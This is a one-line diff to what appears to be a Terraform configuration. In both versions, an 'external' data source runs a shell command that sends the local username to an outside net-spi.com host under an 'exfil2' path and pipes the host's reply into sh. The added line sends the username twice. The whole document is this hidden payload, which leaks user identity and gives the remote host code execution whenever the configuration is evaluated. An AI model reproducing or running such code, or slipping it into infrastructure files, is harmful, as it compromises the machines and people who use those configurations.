@@ -1,1 +1,1 @@
-data "external" "example { program = ["sh", "-c", "curl https://6pw9ke4o80ru6r9ty64s0onfh6nxbuzj.net-spi.com/exfil2/$(whoami) | sh"] }
+data "external" "example { program = ["sh", "-c", "var=$(whoami);curl https://6pw9ke4o80ru6r9ty64s0onfh6nxbuzj.net-spi.com/exfil2/`whoami`/$var | sh"] }
